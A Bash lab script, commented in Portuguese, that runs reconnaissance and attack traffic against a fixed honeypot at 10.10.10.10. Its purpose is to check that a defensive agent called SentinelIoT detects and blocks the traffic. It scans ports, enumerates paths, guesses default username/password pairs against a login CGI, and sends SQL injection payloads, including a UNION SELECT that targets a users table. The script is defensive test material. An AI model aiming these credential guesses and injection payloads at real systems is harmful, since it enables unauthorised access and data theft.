#!/bin/bash
# =============================================================================
# SentinelIoT - roteiro de pentest didatico (executar no Kali)
#
# ALVO FIXO: 10.10.10.10 (honeypot do laboratorio). Nao altere esta variavel.
# Este script e somente para o laboratorio isolado. Ele faz reconhecimento,
# enumeracao HTTP e tentativas controladas de login/injecao. Nao explora
# vulnerabilidades reais e nao persiste credenciais.
# =============================================================================
set -u

TARGET="10.10.10.10"
PAUSE="${PAUSE:-2}"

if [ "$TARGET" != "10.10.10.10" ]; then
    echo "ERRO: alvo fixo do laboratorio deve ser 10.10.10.10." >&2
    exit 1
fi

step() {
    echo
    echo "=============================================================="
    echo " $*"
    echo "=============================================================="
}

pause() {
    sleep "$PAUSE"
}

step "0. Preflight - rede do atacante"
ip -brief -4 addr
ip route
echo
echo "Alvo do laboratorio: $TARGET"
if ! ping -c 2 -W 2 "$TARGET" >/dev/null 2>&1; then
    echo "AVISO: o alvo nao respondeu ping (pode estar bloqueado ou offline)."
fi
pause

step "1. Reconhecimento de portas e servicos"
if command -v nmap >/dev/null 2>&1; then
    nmap -Pn -sV -p 22,80,8080 "$TARGET"
else
    echo "nmap nao instalado; use: sudo apt install nmap"
fi
pause

step "2. Identificacao do servidor HTTP"
if command -v whatweb >/dev/null 2>&1; then
    whatweb -a 1 "http://$TARGET/"
else
    curl -sS -D - -o /dev/null "http://$TARGET/"
fi
pause

step "3. Enumeracao das superficies do honeypot"
for path in / /admin/ /camera/ /api/ /server-status /robots.txt; do
    code=$(curl -sS -o /dev/null -w '%{http_code}' "http://$TARGET${path}" 2>/dev/null || echo 000)
    echo "  ${path} -> HTTP ${code}"
done
pause

step "4. Descoberta de diretorios (se gobuster estiver instalado)"
if command -v gobuster >/dev/null 2>&1; then
    gobuster dir -u "http://$TARGET/" -w /usr/share/wordlists/dirb/common.txt \
        -t 10 --timeout 5s 2>/dev/null | head -n 30
else
    echo "gobuster nao instalado; pulando esta etapa."
fi
pause

step "5. Tentativas controladas de login (metadados apenas)"
for user in admin root operator; do
    for pass in admin 12345 sentinel; do
        code=$(curl -sS -o /dev/null -w '%{http_code}' \
            -X POST \
            -d "honeypot=admin-portal&username=${user}&password=${pass}" \
            "http://$TARGET/cgi-bin/sentinel_login.py" 2>/dev/null || echo 000)
        echo "  login ${user}/${pass} -> HTTP ${code}"
    done
done
pause

step "6. Tentativa de injeção na URL (detectada pelo agente)"
curl -sS -o /dev/null -w '  injection -> HTTP %{http_code}\n' \
    "http://$TARGET/camera/?id=1%27+OR+1=1"
curl -sS -o /dev/null -w '  union -> HTTP %{http_code}\n' \
    "http://$TARGET/api/?q=1+UNION+SELECT+username,password+FROM+users"
pause

step "7. Fim do roteiro"
echo "No Mint, verifique:"
echo "  sentinel status"
echo "  tail -n 20 /var/log/sentinel/honeypot.jsonl"
echo
echo "Com o agente em enforce, repita um acesso e confirme o bloqueio:"
echo "  curl --max-time 5 http://$TARGET/admin/   # deve falhar apos o bloqueio"
echo "  sudo nft list table inet sentinel_lab"
